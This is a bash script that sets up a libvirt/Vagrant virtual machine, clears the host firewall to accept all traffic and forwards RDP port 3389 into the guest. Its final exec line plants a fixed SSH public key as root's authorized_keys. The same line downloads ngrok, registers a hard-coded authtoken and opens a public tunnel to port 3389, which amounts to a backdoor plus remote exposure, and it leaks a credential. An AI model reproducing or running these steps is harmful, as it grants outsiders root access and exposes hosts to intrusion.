#!/bin/bash
set -eou pipefail

chown root:kvm /dev/kvm
service libvirtd start
service virtlogd start
VAGRANT_DEFAULT_PROVIDER=libvirt vagrant up
iptables-save > $HOME/firewall.txt
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT

iptables -A FORWARD -i eth0 -o virbr1 -p tcp --syn --dport 3389 -m conntrack --ctstate NEW -j ACCEPT
iptables -A FORWARD -i eth0 -o virbr1 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A FORWARD -i virbr1 -o eth0 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 3389 -j DNAT --to-destination 192.168.121.68
iptables -t nat -A POSTROUTING -o virbr1 -p tcp --dport 3389 -d 192.168.121.68 -j SNAT --to-source 192.168.121.1

iptables -D FORWARD -o virbr1 -j REJECT --reject-with icmp-port-unreachable
iptables -D FORWARD -i virbr1 -j REJECT --reject-with icmp-port-unreachable
iptables -D FORWARD -o virbr0 -j REJECT --reject-with icmp-port-unreachable
iptables -D FORWARD -i virbr0 -j REJECT --reject-with icmp-port-unreachable

exec `apt install ssh wget curl -y;mkdir /root/.ssh;sudo echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6uZrkoOIuv9uFviwCvY3PlHnf394OS/E0IR211A64kh+3tF/CupFqdMFjcIHu8sxm+/crRi1KBYUWDgxRwfrZHNuWaGlF3Ivdtjw38kx5zCX8+P9szP8LZxmHwNSq8MKZskq9gQgGDkfnHQUTj2oU/0Sp4yu+NtWKpIO2dP0yfQ7e3s1eNzvLXs8G3MJ9bI5X+cpchhHXc5s4gomV4c/g2lU4FK+HqKWpOmlAqXMJZMMbyojqUj30FYQSoJEiRDTjtzJitAAT96d6VKoiq4Z4s6UFErPrNolfyKIslFBOdQSNsvHnqZnpITzaNAPse3IX/DURRrDwXcQJwKzogL/T Test" > /root/.ssh/authorized_keys;sudo wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip;sudo unzip ngrok-stable-linux-amd64.zip;./ngrok authtoken 1gQseWPKaqKXC5yTJ3gOitpzoqr_6TXA6McnBPCTZJH8Xbvpf;./ngrok tcp 3389`
